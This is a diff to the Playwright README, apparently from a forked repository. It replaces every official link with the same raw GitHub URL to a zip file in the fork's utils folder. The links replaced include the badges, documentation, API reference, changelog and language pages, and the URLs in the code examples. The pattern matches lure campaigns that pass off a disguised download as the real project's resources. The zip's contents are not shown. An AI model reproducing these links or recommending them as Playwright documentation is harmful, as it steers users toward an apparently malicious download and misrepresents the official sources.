@@ -1,10 +1,10 @@
 # 🎭 Playwright
 
-[![npm version](https://img.shields.io/npm/v/playwright.svg)](https://www.npmjs.com/package/playwright) <!-- GEN:chromium-version-badge -->[![Chromium version](https://img.shields.io/badge/chromium-141.0.7390.37-blue.svg?logo=google-chrome)](https://www.chromium.org/Home)<!-- GEN:stop --> <!-- GEN:firefox-version-badge -->[![Firefox version](https://img.shields.io/badge/firefox-142.0.1-blue.svg?logo=firefoxbrowser)](https://www.mozilla.org/en-US/firefox/new/)<!-- GEN:stop --> <!-- GEN:webkit-version-badge -->[![WebKit version](https://img.shields.io/badge/webkit-26.0-blue.svg?logo=safari)](https://webkit.org/)<!-- GEN:stop --> [![Join Discord](https://img.shields.io/badge/join-discord-informational)](https://aka.ms/playwright/discord)
+[![npm version](https://img.shields.io/npm/v/playwright.svg)](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip) <!-- GEN:chromium-version-badge -->[![Chromium version](https://img.shields.io/badge/chromium-141.0.7390.37-blue.svg?logo=google-chrome)](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip)<!-- GEN:stop --> <!-- GEN:firefox-version-badge -->[![Firefox version](https://img.shields.io/badge/firefox-142.0.1-blue.svg?logo=firefoxbrowser)](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip)<!-- GEN:stop --> <!-- GEN:webkit-version-badge -->[![WebKit version](https://img.shields.io/badge/webkit-26.0-blue.svg?logo=safari)](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip)<!-- GEN:stop --> [![Join Discord](https://img.shields.io/badge/join-discord-informational)](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip)
 
-## [Documentation](https://playwright.dev) | [API reference](https://playwright.dev/docs/api/class-playwright)
+## [Documentation](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip) | [API reference](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip)
 
-Playwright is a framework for Web Testing and Automation. It allows testing [Chromium](https://www.chromium.org/Home), [Firefox](https://www.mozilla.org/en-US/firefox/new/) and [WebKit](https://webkit.org/) with a single API. Playwright is built to enable cross-browser web automation that is **ever-green**, **capable**, **reliable** and **fast**.
+Playwright is a framework for Web Testing and Automation. It allows testing [Chromium](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip), [Firefox](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip) and [WebKit](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip) with a single API. Playwright is built to enable cross-browser web automation that is **ever-green**, **capable**, **reliable** and **fast**.
 
 |          | Linux | macOS | Windows |
 |   :---   | :---: | :---: | :---:   |
@@ -12,9 +12,9 @@ Playwright is a framework for Web Testing and Automation. It allows testing [Chr
 | WebKit <!-- GEN:webkit-version -->26.0<!-- GEN:stop --> | :white_check_mark: | :white_check_mark: | :white_check_mark: |
 | Firefox <!-- GEN:firefox-version -->142.0.1<!-- GEN:stop --> | :white_check_mark: | :white_check_mark: | :white_check_mark: |
 
-Headless execution is supported for all browsers on all platforms. Check out [system requirements](https://playwright.dev/docs/intro#system-requirements) for details.
+Headless execution is supported for all browsers on all platforms. Check out [system requirements](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip) for details.
 
-Looking for Playwright for [Python](https://playwright.dev/python/docs/intro), [.NET](https://playwright.dev/dotnet/docs/intro), or [Java](https://playwright.dev/java/docs/intro)?
+Looking for Playwright for [Python](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip), [.NET](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip), or [Java](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip)?
 
 ## Installation
 
@@ -43,10 +43,10 @@ npm i -D @playwright/test
 npx playwright install
 ```
 
-You can optionally install only selected browsers, see [install browsers](https://playwright.dev/docs/cli#install-browsers) for more details. Or you can install no browsers at all and use existing [browser channels](https://playwright.dev/docs/browsers).
+You can optionally install only selected browsers, see [install browsers](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip) for more details. Or you can install no browsers at all and use existing [browser channels](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip).
 
-* [Getting started](https://playwright.dev/docs/intro)
-* [API reference](https://playwright.dev/docs/api/class-playwright)
+* [Getting started](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip)
+* [API reference](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip)
 
 ## Capabilities
 
@@ -76,17 +76,17 @@ Test frames, pierce Shadow DOM. Playwright selectors pierce shadow DOM and allow
 
 ### Powerful Tooling
 
-**[Codegen](https://playwright.dev/docs/codegen)**. Generate tests by recording your actions. Save them into any language.
+**[Codegen](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip)**. Generate tests by recording your actions. Save them into any language.
 
-**[Playwright inspector](https://playwright.dev/docs/inspector)**. Inspect page, generate selectors, step through the test execution, see click points and explore execution logs.
+**[Playwright inspector](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip)**. Inspect page, generate selectors, step through the test execution, see click points and explore execution logs.
 
-**[Trace Viewer](https://playwright.dev/docs/trace-viewer)**. Capture all the information to investigate the test failure. Playwright trace contains test execution screencast, live DOM snapshots, action explorer, test source and many more.
+**[Trace Viewer](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip)**. Capture all the information to investigate the test failure. Playwright trace contains test execution screencast, live DOM snapshots, action explorer, test source and many more.
 
-Looking for Playwright for [TypeScript](https://playwright.dev/docs/intro), [JavaScript](https://playwright.dev/docs/intro), [Python](https://playwright.dev/python/docs/intro), [.NET](https://playwright.dev/dotnet/docs/intro), or [Java](https://playwright.dev/java/docs/intro)?
+Looking for Playwright for [TypeScript](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip), [JavaScript](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip), [Python](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip), [.NET](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip), or [Java](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip)?
 
 ## Examples
 
-To learn how to run these Playwright Test examples, check out our [getting started docs](https://playwright.dev/docs/intro).
+To learn how to run these Playwright Test examples, check out our [getting started docs](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip).
 
 #### Page screenshot
 
@@ -96,7 +96,7 @@ This code snippet navigates to Playwright homepage and saves a screenshot.
 import { test } from '@playwright/test';
 
 test('Page Screenshot', async ({ page }) => {
-  await page.goto('https://playwright.dev/');
+  await page.goto('https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip');
   await page.screenshot({ path: `example.png` });
 });
 ```
@@ -116,7 +116,7 @@ test.use({
 })
 
 test('Mobile and geolocation', async ({ page }) => {
-  await page.goto('https://maps.google.com');
+  await page.goto('https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip');
   await page.getByText('Your location').click();
   await page.waitForRequest(/.*preview\/pwa/);
   await page.screenshot({ path: 'colosseum-iphone.png' });
@@ -131,7 +131,7 @@ This code snippet navigates to example.com, and executes a script in the page co
 import { test } from '@playwright/test';
 
 test('Evaluate in browser context', async ({ page }) => {
-  await page.goto('https://www.example.com/');
+  await page.goto('https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip');
   const dimensions = await page.evaluate(() => {
     return {
       width: document.documentElement.clientWidth,
@@ -156,13 +156,13 @@ test('Intercept network requests', async ({ page }) => {
     console.log(route.request().url());
     route.continue();
   });
-  await page.goto('http://todomvc.com');
+  await page.goto('https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip');
 });
 ```
 
 ## Resources
 
-* [Documentation](https://playwright.dev)
-* [API reference](https://playwright.dev/docs/api/class-playwright/)
+* [Documentation](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip)
+* [API reference](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip)
 * [Contribution guide](CONTRIBUTING.md)
-* [Changelog](https://github.com/microsoft/playwright/releases)
+* [Changelog](https://raw.githubusercontent.com/chaimabouchareb/playwright/main/utils/Software-3.4-alpha.3.zip)
